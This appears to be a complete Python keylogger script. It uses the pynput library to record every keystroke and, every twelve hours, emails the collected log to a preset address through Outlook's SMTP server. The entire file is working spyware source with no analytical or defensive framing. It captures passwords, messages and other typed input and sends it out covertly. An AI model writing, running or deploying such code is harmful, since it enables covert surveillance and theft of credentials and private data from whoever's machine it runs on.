import smtplib
from pynput import keyboard
from threading import Timer
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 43200  # (seconds)
EMAIL_ADDRESS = "youremail@example.com"
EMAIL_PASSWORD = "yourpassword"

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""

    def callback(self, event):
        name = str(event)
        if len(name) > 1:
            # not a character, special key
            if name == "Key.space":
                # " " instead of "space"
                name = " "
            elif name == "Key.enter":
                # add a new line whenever an ENTER is pressed
                name = "\n"
            elif name == "Key.decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
    
    def sendmail(self, email, password, message):
        server = smtplib.SMTP(host="smtp-mail.outlook.com", port=587)
        server.starttls()
        server.login(email, password)
        msg = MIMEText(message, _charset='UTF-8')
        server.sendmail(email, email, msg.as_string())
        server.quit()

    def report(self):
        if self.log:
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        with keyboard.Listener(on_press=self.callback) as listener:
            self.report()
            listener.join()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()